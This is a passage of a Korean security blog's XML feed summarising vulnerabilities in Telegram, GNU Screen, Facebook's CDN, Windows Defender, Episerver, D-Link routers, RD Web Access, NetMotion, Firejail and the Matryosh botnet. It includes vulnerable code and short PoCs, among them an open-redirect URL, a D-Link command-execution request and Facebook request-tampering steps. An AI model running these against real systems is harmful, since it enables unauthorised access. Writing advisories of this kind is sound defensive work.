class="hljs-literal">true</span>;    curColor = curr-&gt;second.premulARGB(opacity);  <span class="hljs-comment">// out-of-bounds value, curr-&gt;second is controlled</span>    incr = <span class="hljs-number">1.0</span> / (<span class="hljs-built_in">float</span>)size;                     <span class="hljs-comment">// static</span>    fpos = <span class="hljs-number">1.5</span> * incr;                            <span class="hljs-comment">// static</span>    colorTable[pos++] = curColor;    <span class="hljs-keyword">while</span> (fpos &lt;= curr-&gt;first) &#123;                 <span class="hljs-comment">// curr-&gt;first is controlled and pos is not checked to be &lt; size, leading to </span>        colorTable[pos] = colorTable[pos - <span class="hljs-number">1</span>];    <span class="hljs-comment">// out-of-bounds write</span>        pos++;        fpos += incr;    &#125;    [...]</code></pre><p><code>size</code>, <code>fpos</code>, <code>incr</code>는 static value이고, <code>curr-&gt;first</code>, <code>curr-&gt;second</code>는 애니메이션 스티커에서 값을 직접 받아옵니다. 반복문에서 <code>colorTable</code>을 할당할 때 <code>pos</code>와<code>colorTable</code> 배열 크기인  <code>size</code> 간의 검사를 하지 않아 애니메이션 스티커의 <code>curr-&gt;first</code> 값에 따라 힙 메모리 arbitrary overwrite가 가능합니다.</p><p>스티커를 통해 overwrite 된 값은 <code>premulARGB()</code>와 <code>getColorReplacement()</code>를 통해 인코딩 되고, 해당 함수들의 소스 코드를 확인할 수 있으므로 해커가 조작할 수 있으며, ASLR 우회 가젯이 존재하면 Remote Code Execution이 가능합니다.</p><p>해당 취약점은 사용자가 보낸 <code>sticker.id</code>가 텔레그램 클라우드의 public sticker set에 존재하는지 확인하여 임의로 조작된 스티커 파일을 전송할 수 없는 방법으로 패치되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>heap</tag>
      
      <tag>idioth</tag>
      
      <tag>telegram</tag>
      
      <tag>out-of-bounds</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] GNU Screen crashs while processing characters</title>
    <link href="/2021/02/17/fabu1ous/2021-02-17/"/>
    <url>/2021/02/17/fabu1ous/2021-02-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26937">CVE-2021-26937</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>GNU screen &lt;= 4.8.0</p><ul><li>Debian 9 ( GNU Screen 4.05.00 )</li><li>Raspbian 10 ( GNU Screen 4.06.02 )</li><li>Ubuntu 20.04.1 ( GNU Screen 4.08.00, Windows WSL )</li><li>Ubuntu 20.04 ( GNU Screen 4.08.00 )</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>GNU Screen은 여러 프로세스의 터미널을 한 화면에서 조작할 수 있게 도와주는 multiplexer로, Mac OSX와 대부분의 Linux 배포판에 포함되어있습니다. GNU Screen 4.8.0 이전 버전은 특정 UTF-8 문자 조합을 처리하는 과정에서 취약점(CVE-2021-26937)이 발생합니다. 해커는 이를 악용해 원격 시스템을 대상으로 invalid write access와 Dos를 할 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!combchars[i])&#123;combchars[i] = (strcut comchar *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(struct combchar));<span class="hljs-keyword">if</span> (!comchars[i])<span class="hljs-keyword">return</span>;combchars[i]-&gt;prev = i;combchars[i]-&gt;next = i;&#125;</code></pre><p>encode.c의 일부 코드입니다. <code>comchars[i]</code>의 out-of-range로 인해 특정 UTF-8 문자열이 화면에 출력되면 GNU Screen이 비정상 종료됩니다.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><strong>PoC</strong></h2><p><img src="/2021/02/17/fabu1ous/2021-02-17/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Access files uploaded by employees to internal CDNs</title>
    <link href="/2021/02/16/idioth/2021-02-16/"/>
    <url>/2021/02/16/idioth/2021-02-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ysamm.com/?p=606">Access files uploaded by employees to internal CDNs / Regenerate URL Signature of user uploaded content</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Facebook</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>일반 페이스북 유저가 비공개로 돌리거나 삭제한 콘텐츠나 직원이 업로드한 파일을 다운로드할 수 있는 취약점이 발견되었습니다. 해당 취약점을 통해 유효한 파일 URL이 존재하더라도 일반 유저가 접근할 수 없는 <code>interncache-cln.fbcdn.net</code>과 같은 내부 CDN으로부터 파일을 받아올 수 있습니다.</p><p>다운로드할 파일은 파일(핸들)의 id를 표현하는 암호화된 문자열을 통해 식별할 수 있습니다. 이전 URL이나 파일 핸들을 알면 내부 CDN에 직원이 업로드한 파일에 접근이 가능합니다. 취약점을 악용하기 위한 세팅은 다음과 같습니다.</p><ol><li><code>https://www.facebook.com/collabsmanager/start/</code>에서 Creator 등록합니다.</li><li>승인되면, <code>https://www.facebook.com/collabsmanager/</code>에 접속하여 로그인합니다. <code>https://business.facebook.com/collabsmanager/creator/creator_portfolio/&#123;ID&#125;/</code>와 유사한 URL로 리다이렉트 되어야 합니다.</li></ol><p>Creator 등록이 완료되면, 다음 순서로 취약점을 트리거할 수 있습니다.</p><ol><li>request 반복을 위해 BurpSuite 같은 프록시 실행</li><li>“Introduction”에서 “Edit” 클릭</li><li>“Add Video”를 클릭하여 비디오 업로드</li><li>업로드가 완료되면 “Delete” 버튼을 눌러 업로드된 비디오 삭제</li><li>BurpSuite history에서 다음과 같은 3개의 엔드포인트 획득<ol><li><code>https://vupload-edge.facebook.com/ajax/video/upload/requests/start/</code></li><li><code>https://vupload-edge.facebook.com/ajax/video/upload/requests/receive/</code></li><li><code>https://business.facebook.com/branded_content/creator_profile/pitch_deck_video/async/save/</code></li></ol></li><li><code>file_extension</code> 파라미터 값을 <code>jpg</code>로 수정 후 <code>https://vupload-edge.facebook.com/ajax/video/upload/requests/start/</code>에 request를 보내면 response의 <code>video_id</code> XXXXXXXX를 받을 수 있습니다.</li><li><code>video_id</code> 파라미터 값을 XXXXXXXX로 수정 후 <code>https://vupload-edge.facebook.com/ajax/video/upload/requests/receive/</code>에 request를 보냅니다.</li><li><code>fpuploader_video_file_chunk</code> 파라미터 값을 다음과 같은 값으로 변경합니다.<ul><li><code>1:dW5kZWZpbmVk:application/octet-stream:GBapFAFK2bAstIUBAAAAAACthEIbbj07AACa:e:1568148336:ARa5BNCPUwoIKBVqyao</code></li></ul></li></ol><p><code>GBapFAFK2bAstIUBAAAAAACthEIbbj07AACa</code>는 파일의 HANDLE이며, CDN에 업로드된 파일을 나타냅니다. 이 핸들 값을 수정하여 다운로드할 파일을 지정할 수 있습니다.(ex.<code>GFxcvkCRANjMRgABANB4MEoAAAAAbnsvAAAB </code>) 핸들 값을 수정한 후 <code>start_offset</code>과 <code>end_offset</code> 값을 얻기 위해 response를 받습니다.</p><ol start="9"><li><code>video_id</code>를 XXXXXXX로 바꾼 후 <code>https://business.facebook.com/branded_content/creator_profile/pitch_dec_video/async/save/</code>에 request를 보냅니다.</li><li><code>https://business.facebook.com/collabsmanager/creator/creator_portfolio/&#123;ID&#125;/</code>에 접속하여 비디오 플레이어 source tag의 <code>src</code> 값을 확인하면 수정된 핸들 값에 해당하는 <code>scontent.*.fbcdn.net</code> 도메인을 가진 파일 URL을 찾을 수 있습니다. 해당 파일 URL은 내부 CDN에 존재하는 파일이 공용 CDN에서 접근할 수 있는 파일로 복사된 것입니다.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>facebook</tag>
      
      <tag>cdn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-24092: 12년동안 존재한 Windows Defender 권한상승 취약점</title>
    <link href="/2021/02/15/l0ch/2021-02-15/"/>
    <url>/2021/02/15/l0ch/2021-02-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.sentinelone.com/cve-2021-24092-12-years-in-hiding-a-privilege-escalation-vulnerability-in-windows-defender/?fbclid=IwAR3HRkRwINUj1LDAsZ55Mz8t6CKqOsCFaRgmy19M0i7HJ_txY3Qp3dzPOsM">CVE-2021-24092: 12 Years in Hiding – A Privilege Escalation Vulnerability in Windows Defender</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows Defender</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender에서 잘못된 파일 검증으로 인한 권한 상승 취약점이 발견되었습니다. 이는 2009년부터 존재해 약 12년 동안 수정되지 않은 취약점입니다.</p><p><code>BTR.sys</code> 드라이버는 Windows Defender의 수정 프로세스로, 커널 모드에서 악성 소프트웨어에 의해 생성된 파일 시스템 및 레지스트리를 삭제하는 기능을 수행합니다.</p><p>해당 드라이버가 로드되고 활성화될 때 <code>NTCreateFile</code> 함수를 사용해 <code>C:\Windows\Temp\BootClean.log</code> 파일에 대한 핸들을 생성합니다. 이때 매개변수 <code>CreateDisposition</code> 필드에 파일이 존재하면 원본 파일을 삭제하고 새 파일을 생성하는 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile">FILE_SUPERSEDE</a> 옵션을 설정하는데, 해당 파일이 링크인지 여부를 검증하지 않아 시스템 권한으로 임의 파일을 덮어쓸 수 있습니다.</p><p>취약점을 트리거하는 방법은 아래와 같습니다.</p><ol><li>해커가 <code>C:\Windows\Temp\BootClean.log</code> 를 임의 파일에 대한 하드 링크로 생성합니다.</li><li>Windows Defender에서 BTR 드라이버를 로드합니다.</li><li>해커는 하드 링크로 연결된 임의 파일을 멀웨어 등으로 덮어쓸 수 있습니다.</li></ol><p>Microsoft는 2월 9일에 취약점에 대한 패치를 발표했습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>windows defender</tag>
      
      <tag>privilege escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-24550 : Open redirect in Episerver Find</title>
    <link href="/2021/02/13/fabu1ous/2021-02-13/"/>
    <url>/2021/02/13/fabu1ous/2021-02-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://labs.nettitude.com/blog/cve-2020-24550-open-redirect-in-episerver-find/">cve-2020-24550</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Episerver Find &lt; 13.2.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Episerver Find는 컨텐츠 관리, e-commerce, 자동 마케팅 등의 기능이 포함된 검색엔진 플랫폼입니다. Episerver Find 13.2.6 이전 버전에서 발생하는 Open redirect 취약점(CVE-2020-24550)의 세부 정보가 공개되었습니다.</p><p>Episerver Find는 <code>_t_redirect</code> 파라미터로 untrusted input을 redirect 함수에 전달합니다. 따라서 해커는 해당 파라미터를 통해 사용자를 임의의 URL로 redirect 할 수 있습니다.</p><pre><code class="hljs csharp">[<span class="hljs-meta">HttpGet</span>]<span class="hljs-function"><span class="hljs-keyword">public</span> HttpResponseMessage <span class="hljs-title">Index</span>(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">[FromUri(Name = <span class="hljs-string">&quot;_t_id&quot;</span></span>)] <span class="hljs-keyword">string</span> id,</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_q&quot;</span></span>)] <span class="hljs-keyword">string</span> query,</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_hit.id&quot;</span></span>)] <span class="hljs-keyword">string</span> hitId,</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_redirect&quot;</span></span>)] <span class="hljs-keyword">string</span> redirect</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_hit.pos&quot;</span></span>)] <span class="hljs-keyword">int</span>? hitPos</span> = <span class="hljs-literal">null</span>,[<span class="hljs-meta">FromUri(Name = <span class="hljs-meta-string">&quot;_t_tags&quot;</span>)</span>] <span class="hljs-keyword">string</span> tags = <span class="hljs-string">&quot;&quot;</span>)&#123;  <span class="hljs-keyword">this</span>.PostTrackData(id, query, hitId, hitPos, tags);  HttpResponseMessage response = HttpRequestMessageExtentions.CreateResponse(<span class="hljs-keyword">this</span>.get_Request(), HttpStatusCode.MovedPermanently);  response.Headers.Location = <span class="hljs-keyword">new</span> Uri(redirect);  <span class="hljs-keyword">return</span> response;&#125;</code></pre><p><code>EPiServer.Find.UI.Controllers.ClickController.Index()</code> 메소드의 코드입니다. <code>_t_redirect</code>파라미터의 값이 Location header인 301 redirect reponse를 리턴합니다.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><strong>PoC</strong></h2><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>&#123;vulnerable&#125;<span class="hljs-regexp">/find_v2/</span>_click?_t_id=&amp;_t_q=&amp;_t_hit.id=&amp;_t_redirect=https:/hackyboiz.github.io</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>open redirect</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-24581: D-Link 라우터의 의도적인 RCE 취약점</title>
    <link href="/2021/02/12/l0ch/2021-02-12/"/>
    <url>/2021/02/12/l0ch/2021-02-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://reconshell.com/cve-2020-24581-d-link-dsl-2888a-remote-command-execution/">CVE-2020-24581 D-Link DSL-2888A Remote Command Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>D-Link DSL-2888A AU_2.31_V1.1.47ae55 이전 버전</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>대만 D-link사의 통합 서비스 라우터 제품인 DSL-2888A 펌웨어에서 원격 코드 실행 취약점이 발견되었습니다. 보안 연구원들은 취약점이 발생하는 기능이 웹 인터페이스에서 정상적인 사용으로는 접근할 수 없어 의도적으로 숨겨진 기능이라고 분석했습니다.</p><p>해당 제품이 웹 서비스를 초기화할 때 <code>cgi-bin</code>컴포넌트가 로드됩니다. 취약점은 <code>cgi-bin</code> 디렉터리의 <code>execute_cmd.cgi</code> 파일에 존재하며 인증된 사용자가 <code>execute_cmd.cgi</code>에 접근 시 <code>ajax.js</code>에서 요청 쿼리의 두 번째 매개변수를 가져와 실행하는데, 이때 매개 변수에 대한 검증이 없어 임의 명령 실행이 가능합니다.</p><pre><code class="hljs jsx">get : <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">_dataType</span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">var</span> _url = <span class="hljs-built_in">this</span>.url;<span class="hljs-keyword">if</span>(_url.indexOf(<span class="hljs-string">&#x27;?&#x27;</span>) == <span class="hljs-number">-1</span>)_url += <span class="hljs-string">&#x27;?timestamp=&#x27;</span> + <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().getTime();<span class="hljs-keyword">else</span>_url += <span class="hljs-string">&quot;&amp;timestamp=&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().getTime();<span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.queryString.length &gt; <span class="hljs-number">0</span>)_url += <span class="hljs-string">&quot;&amp;&quot;</span> + <span class="hljs-built_in">this</span>.queryString;<span class="hljs-built_in">this</span>.xmlHttp.open(<span class="hljs-string">&quot;GET&quot;</span>, _url, <span class="hljs-literal">true</span>);...</code></pre><p>해당 취약점은 인증 우회 취약점인 CVE-2020-24579와 같이 악용되어 다음과 같이 인증되지 않은 사용자가 임의 명령을 실행할 수 있습니다.</p><ol><li>아무 관리자 패스워드로 로그인 인증을 수행합니다.</li><li>내부적으로는 유효한 인증 세션이 이루어져 인증 페이지에 접근할 수 있습니다. (CVE-2020-24579)</li><li>이후 ls 명령어를 실행하는 poc는 다음과 같습니다.</li></ol><pre><code class="hljs http">http://[DeviceIP]/cgi-bin/execute_cmd.cgi?timestamp=1589333279490&amp;cmd=ls</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>router</tag>
      
      <tag>d-link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft RD Web Access Authentication Timing Attack</title>
    <link href="/2021/02/11/idioth/2021-02-11/"/>
    <url>/2021/02/11/idioth/2021-02-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://raxis.com/blog/rd-web-access-vulnerability">Microsoft Remote Desktop Web Access Authentication Timing Attack</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Server 2016</li><li>Windows Server 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft의 Remote Desktop Web Access 애플리케이션(RD Web Access)에서 Active Directory 도메인 내의 사용자 이름을 확인할 수 있는 anonymous authentication timing attack 취약점이 발견되었습니다. RD Web Access는 웹 브라우저를 통해 원격 데스크톱 서비스에 접근할 수 있는 웹 기반 원격 데스크톱 클라이언트입니다.</p><p>해당 취약점과 비슷한 타이밍 기반 인증 취약점이 Outlook Web 애플리케이션에도 존재합니다. 유효한 사용자와 유효하지 않은 사용자의 인증 시도의 응답 시간을 비교하여 유효한 사용자인지 확인할 수 있습니다. RD Web Access에서 유효한 사용자의 응답 시간은 비밀번호가 틀려도 232 밀리세컨드의 시간이 걸리지만, 유효하지 않은 사용자의 경우 응답 시간이 4초가 넘어갑니다. 대상 서버가 인증 시도 요청에 응답하는 시간을 통해 사용자 이름의 유효성을 확인할 수 있습니다.</p><p>해당 취약점을 악용하기 위해서는 대상 서버의 Active Directory 도메인을 알아야 합니다. RPC에 접근할 수 있는 경우 조작된 NTLM Challenge 요청을 통해 타깃의 Active Directory 도메인을 알 수 있습니다. Active Directory 도메인을 얻으면, 도메인으로부터 유효한 사용자의 이름을 얻을 수 있습니다. 해커는 이 취약점을 악용하여 Active Directory 환경에 대한 정보를 수집하고 2차 공격에 사용할 수 있는 유효한 사용자 이름 리스트를 얻을 수 있습니다.</p><p>해당 취약점의 metasploit 모듈 업데이트 정보는 <a href="https://github.com/rapid7/metasploit-framework/pull/14544">여기</a>에서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>rd web</tag>
      
      <tag>timming attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26912: NetMotion Mobility Deserialization to RCE</title>
    <link href="/2021/02/10/fabu1ous/2021-02-10/"/>
    <url>/2021/02/10/fabu1ous/2021-02-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-netmotion-mobility-server-multiple-deserialization-of-untrusted-data-lead-to-rce/">NetMotion Mobility Server Multiple Deserializaion of Untrusted Data Lead to RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>NetMotion Mobility Server 11.73 이전 버전</p><p>NetMotion Mobility Server 12.01.09045</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NetMotion Mobility는 사내 네트워크를 안전하게 외부 모바일 기기로 연장시키기 위해 사용하는 VPN입니다. NetMotion Mobility Server 12.01.09045는 untrusted data에 대한 Java deserialization취약점 패턴이 여러 개 존재해 SYSTEM 권한으로 원격코드 실행이 가능합니다(CVE-2021-26912).</p><ol><li><p>SupportRpcServlet</p><pre><code class="hljs java">...RpcData rpcData = (RpcData)objectInputStream.readObject();      <span class="hljs-keyword">if</span> (rpcData.validate(<span class="hljs-keyword">true</span>)) &#123;        command(paramHttpServletResponse, rpcData);      &#125;...</code></pre><p><code>com.nmwco.server.support.SupportRpcServlet</code> 클래스의 코드입니다. Inputstream으로부터 특별한 검사 및 보호 없이 <code>readObject()</code>를 통해 <code>rpcData</code>의 값을 설정합니다. Inputstream은 해커가 제어(attacker-controlled)할 수 있으므로 RCE가 가능합니다.</p></li><li><p>RpcServlet</p><pre><code class="hljs aspectj">...  <span class="hljs-keyword">public</span> <span class="hljs-function">RpcData <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream param1ObjectInputStream)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;            <span class="hljs-keyword">return</span> (RpcData)param1ObjectInputStream.readObject();          &#125;...</code></pre><p><code>com.nmwco.server.events.EventRpcServlet</code> 클래스의 코드입니다. readObject dispatcher는 RpcData 타입의 입력을 받을 때 attacker-controlled 데이터에 대한 검사를 하지 않습니다.</p></li><li><p>MvcUtil valueStringToObject</p><pre><code class="hljs java">...mvcController.invoke(servletContext, paramHttpServletRequest, paramHttpServletResponse);...</code></pre><p><code>com.nmwco.server.mvc.MvcServlet</code> 클래스의 코드입니다. attacker-contolled 데이터인 <code>paramHttpServletRequest</code>를 2번째 인자로 <code>invoke</code> 메서드가 사용됩니다.</p></li><li><p>webrepdb StatusServlet</p><pre><code class="hljs lasso"><span class="hljs-params">...</span>param1ObjectInputStream) throws Exception &#123;   <span class="hljs-comment">// 1</span>            <span class="hljs-keyword">return</span> (RpcData)param1ObjectInputStream.readObject();          &#125;<span class="hljs-params">...</span></code></pre><p><code>com.nmwco.server.web.repdb.StatusServlet</code> 클래스의 코드입니다. attacker-controlled 데이터에 대한 <code>readObject()</code>호출을 사용해 GET 또는 POST request에 대한 디스패처를 설정합니다.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>deserialization</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Privilege escalation in firejail overlayfs</title>
    <link href="/2021/02/09/l0ch/2021-02-09/"/>
    <url>/2021/02/09/l0ch/2021-02-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q1/121">Firejail: root privilege escalation in OverlayFS code</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firejail 0.9.30</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firejail은 Linux 환경에서 애플리케이션의 실행 환경을 제한하는 SUID 샌드박싱 애플리케이션입니다. Linux용 통합 마운트 파일 시스템인 <a href="https://en.wikipedia.org/wiki/OverlayFS">overlayfs</a> 기능이 활성화된 Firejail에서 race condition을 통해 root 권한으로 임의 파일을 수정할 수 있는 취약점이 발견되었습니다.</p><p>아래는  <code>fs_overlayfs()</code> 함수의 취약점이 발생하는 소스코드입니다</p><pre><code class="hljs c">    <span class="hljs-number">943</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fs_overlayfs</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;...    <span class="hljs-number">969</span>         <span class="hljs-comment">// we disable overlayfs for now, pending fixing</span>    <span class="hljs-number">970</span>         <span class="hljs-keyword">if</span> (major &gt;= <span class="hljs-number">4</span> &amp;&amp;minor &gt;= <span class="hljs-number">19</span>) &#123;    <span class="hljs-number">971</span>                 <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Error: OverlayFS disabled for Linux kernels 4.19 and newer, pending fixing.\\n&quot;</span>);    <span class="hljs-number">972</span>                 <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    <span class="hljs-number">973</span>         &#125;...   <span class="hljs-number">1033</span>         <span class="hljs-keyword">if</span> (mkdirat(basefd, <span class="hljs-string">&quot;odiff&quot;</span>, <span class="hljs-number">0755</span>) == <span class="hljs-number">-1</span> &amp;&amp; errno != EEXIST) &#123;   <span class="hljs-number">1034</span>                 perror(<span class="hljs-string">&quot;mkdir&quot;</span>);   <span class="hljs-number">1035</span>                 <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Error: cannot create overlay directory         %s\\n&quot;</span>, odiff);   <span class="hljs-number">1036</span>                 <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);   <span class="hljs-number">1037</span>         &#125;   <span class="hljs-number">1038</span>         ASSERT_PERMS(odiff, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0755</span>);...   <span class="hljs-number">1065</span>         <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// kernel 3.18 or newer</span>   <span class="hljs-number">1066</span>                 <span class="hljs-keyword">if</span> (asprintf(&amp;option, <span class="hljs-string">&quot;lowerdir=/,upperdir=%s,workdir=%s        &quot;</span>, odiff, owork) == <span class="hljs-number">-1</span>)   <span class="hljs-number">1067</span>                         errExit(<span class="hljs-string">&quot;asprintf&quot;</span>);   <span class="hljs-number">1068</span>                 <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;overlay&quot;</span>, oroot, <span class="hljs-string">&quot;overlay&quot;</span>, MS_MGC_VAL, optio        n) &lt; <span class="hljs-number">0</span>) &#123;</code></pre><p>Firejail은 overlayfs를 사용하기 위해 사용자 홈 디렉터리에서 시작하는 마운트 대상 디렉터리를 찾아 이동하며 root 소유이고, 다른 사용자/그룹 권한이 없는지 확인한 뒤 마운트 합니다. 이때 디렉터리 참조에 파일 디스크립터를 사용하지 않고 절대 경로를 사용하는데, 권한 체크와 마운트 사이 시간 동안 마운트 대상 디렉터리를 해커가 조작한 디렉터리로 교체할 수 있습니다.</p><p>이를 악용하면 교체된 디렉터리의 심볼릭 링크를 통해 root 권한으로 샌드박스 외부 시스템 파일을 임의로 수정할 수 있습니다.</p><p>Firejail 개발사는 overlayfs 기능을 일시적으로 비활성화 한 업데이트를 릴리스했으며, 해당 패치는 <a href="https://github.com/netblue30/firejail/commit/97d8a03cad19501f017587cc4e47d8418273834b%EC%97%90%EC%84%9C">https://github.com/netblue30/firejail/commit/97d8a03cad19501f017587cc4e47d8418273834b에서</a> 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>toctou</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file modification</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 안드로이드 장치를 타겟으로 한 Matryosh Botnet</title>
    <link href="/2021/02/08/idioth/2021-02-08/"/>
    <url>/2021/02/08/idioth/2021-02-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netlab.360.com/matryosh-botnet-is-spreading-en/">New Threat: Matryosh Botnet Is Spreading</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ADB(Android Debug Bridge) 기능이 활성화 되어있는 안드로이드 장치</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>360 netlab에서 ADB(Android Debug Bridge)를 통해 전파되고 있는 DDoS를 목적으로 한 봇넷 ‘Matryosh’을 발견했습니다. <a href="https://developer.android.com/studio/command-line/adb?hl=ko">ADB</a>는 개발자가 안드로이드 기기에 앱의 설치나 디버깅 같은 작업을 위한 명령 실행줄입니다.</p><p>Matryosh는 Mirai 프레임워크를 재사용하였으며, 암호 알고리즘을 재 구현하였고 DNS TXT record를 통해 원격 호스트에서 토르 C2와 토르 프록시를 가져옵니다. 360 netlab에서는 러시아의 마트료시카 인형처럼 프로세스의 레이어가 중첩되어 있어서 Matryosh라 명명하였습니다.</p><p>Matryosh는 감염된 장치에서 실행될 때 프로세스의 이름을 14 글자의 무작위 대소문자로 바꾸고 <code>stdin: pipe failed</code>를 출력합니다. 그 후 토르 C2와 토르 프록시를 얻어오는데, 그 과정은 다음과 같습니다.</p><ol><li>원격 호스트 A(<code>hosts.hiddenservice.xyz</code>)를 복호화해서 가져오고 DNS TXT request에 대한 response를 받아옵니다.</li></ol><pre><code class="hljs 